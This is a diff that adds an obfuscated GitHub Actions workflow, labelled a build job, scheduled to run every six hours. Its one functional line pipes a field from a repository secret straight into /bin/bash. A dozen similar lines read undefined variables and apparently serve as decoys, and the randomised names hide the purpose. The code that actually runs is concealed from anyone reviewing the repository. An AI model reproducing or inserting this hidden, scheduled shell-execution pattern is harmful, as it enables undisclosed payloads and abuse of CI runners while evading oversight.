@@ -1,0 +1,29 @@
+name: wumenkanquanzhendejiade
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wumenkanquanzhendejiade
+        env:
+          lqn43243: ${{ secrets.lqn43243 }}
+        run: |
+          echo $lqn43243 | jq -r .dxvh427 | /bin/bash
+          echo $o7 | jq -r .qyq29062 | /bin/bash
+          echo $yv85 | jq -r .o092 | /bin/bash
+          echo $oitt60172 | jq -r .in5495 | /bin/bash
+          echo $u5 | jq -r .gau2174 | /bin/bash
+          echo $quxre160 | jq -r .h68 | /bin/bash
+          echo $m96065 | jq -r .erd55406 | /bin/bash
+          echo $gcsfr23 | jq -r .djjtt358 | /bin/bash
+          echo $v77 | jq -r .fv25 | /bin/bash
+          echo $ybhe785 | jq -r .dtna4240 | /bin/bash
+          echo $bpcnt13744 | jq -r .lfs08 | /bin/bash
+          echo $ogupi2 | jq -r .fbedy1770 | /bin/bash
+          echo $pql81713 | jq -r .t729 | /bin/bash
+
